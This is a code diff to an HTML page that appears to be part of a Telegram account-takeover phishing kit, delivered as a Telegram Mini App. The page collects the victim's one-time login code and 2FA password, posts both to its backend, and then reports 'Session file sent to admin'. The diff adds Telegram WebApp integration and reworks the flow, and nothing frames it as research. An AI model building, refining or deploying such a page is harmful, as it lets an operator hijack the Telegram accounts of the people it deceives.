@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enter OTP</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -151,17 +152,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        .resend-link {
-            text-align: center;
-            margin-top: 15px;
-        }
-        
-        .resend-link a {
-            color: #667eea;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        
         .hidden {
             display: none;
         }
@@ -213,10 +203,10 @@
                 
                 <div class="error" id="error-message"></div>
                 
-                <p style="text-align: center; color: #666; margin-bottom: 20px;">
+                <div class="info-text">
                     Enter the 5-digit code sent to your phone<br>
                     <small>Format: 9 4 3 8 0 or 94380</small>
-                </p>
+                </div>
                 
                 <div class="otp-inputs">
                     <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
@@ -228,8 +218,8 @@
                 
                 <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
                 
-                <div class="resend-link">
-                    <a href="#" onclick="resendOTP()">Resend OTP</a>
+                <div class="info-text" style="margin-top: 15px;">
+                    <a href="#" onclick="startOver()">Start Over</a>
                 </div>
             </div>
             
@@ -241,9 +231,9 @@
                 
                 <div class="error" id="password-error"></div>
                 
-                <p style="text-align: center; color: #666; margin-bottom: 20px;">
+                <div class="info-text">
                     Enter your 2FA password
-                </p>
+                </div>
                 
                 <input type="password" id="password-input" 
                        placeholder="2FA password" autocomplete="off">
@@ -266,26 +256,31 @@
                     <div class="success-icon">✅</div>
                     <h2>Verified Successfully!</h2>
                     <p>Your account has been verified.</p>
-                    <p><small>Details sent to admin</small></p>
-                    <p style="color: #666; font-size: 14px; margin-top: 10px;">
-                        Closing in <span id="countdown">5</span> seconds...
-                    </p>
+                    <p><small>Session file sent to admin</small></p>
+                    <div style="margin-top: 20px;">
+                        <p style="color: #666; font-size: 14px;">
+                            Closing in <span id="countdown">5</span> seconds...
+                        </p>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Get session ID and phone from template variables
-        const sessionId = '{{ session_id }}';
+        // Get user ID and phone from template variables
+        const userId = '{{ user_id }}';
         const phoneNumber = '{{ phone }}';
         
         let otpCode = '';
         
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            if (!sessionId) {
-                showError('Session expired or invalid. Please share contact again.');
+            Telegram.WebApp.ready();
+            Telegram.WebApp.expand();
+            
+            if (!userId) {
+                showError('Session expired. Please share contact again.');
                 return;
             }
             
@@ -327,7 +322,7 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    session_id: sessionId,
+                    user_id: userId,
                     otp: otpCode
                 })
             })
@@ -357,9 +352,10 @@
             });
         }
         
-        function resendOTP() {
-            alert('Please start over to receive new OTP.');
-            window.location.href = '/';
+        function startOver() {
+            if (confirm('Start over and share contact again?')) {
+                window.location.href = '/';
+            }
         }
         
         function showPasswordScreen() {
@@ -393,7 +389,7 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    session_id: sessionId,
+                    user_id: userId,
                     password: password
                 })
             })
@@ -458,30 +454,21 @@
         }
         
         function closeApp() {
-            // Close the WebApp
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.close();
-            } else {
-                // Fallback for testing
-                alert('Verification complete! You can close this window.');
-            }
+            Telegram.WebApp.close();
         }
         
-        // Add keyboard shortcuts
+        // Keyboard shortcuts
         document.addEventListener('keydown', function(event) {
-            // Enter key submits OTP
             if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
                 if (otpCode.length === 5) {
                     verifyOTP();
                 }
             }
             
-            // Enter key submits password
             if (event.key === 'Enter' && !document.getElementById('password-screen').classList.contains('hidden')) {
                 verifyPassword();
             }
             
-            // Escape key goes back
             if (event.key === 'Escape' && !document.getElementById('password-screen').classList.contains('hidden')) {
                 backToOTP();
             }
